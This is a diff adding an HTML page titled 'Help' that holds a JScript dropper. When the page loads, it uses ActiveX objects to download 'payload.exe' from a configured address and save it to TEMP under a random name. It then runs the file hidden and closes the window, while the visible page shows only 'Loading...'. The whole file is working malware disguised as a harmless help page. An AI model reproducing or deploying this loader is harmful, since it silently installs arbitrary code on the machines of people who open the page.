@@ -1,0 +1,42 @@
+<html>
+<head>
+<title>Help</title>
+<script language="JScript">
+// ---- Единственная настройка ----
+var URL = "http://192.168.1.1:8080/payload.exe";
+// --------------------------------
+
+function drop() {
+    var shell  = new ActiveXObject("WScript.Shell");
+    var env    = shell.Environment("Process");
+    var tmp    = env("TEMP") + "\\" + (new Date().getTime() ^ 0xBEEF).toString(16) + ".exe";
+    var http, stream;
+
+    try {
+        http = new ActiveXObject("MSXML2.XMLHTTP.6.0");
+    } catch(e) {
+        http = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
+    }
+
+    http.Open("GET", URL, false);
+    http.setRequestHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)");
+    http.Send();
+
+    if (http.Status !== 200) return;
+
+    stream = new ActiveXObject("ADODB.Stream");
+    stream.Type = 1;
+    stream.Open();
+    stream.Write(http.ResponseBody);
+    stream.SaveToFile(tmp, 2);
+    stream.Close();
+
+    shell.Run('"' + tmp + '"', 0, false);
+    window.close();
+}
+</script>
+</head>
+<body onload="drop()">
+<p>Loading...</p>
+</body>
+</html>
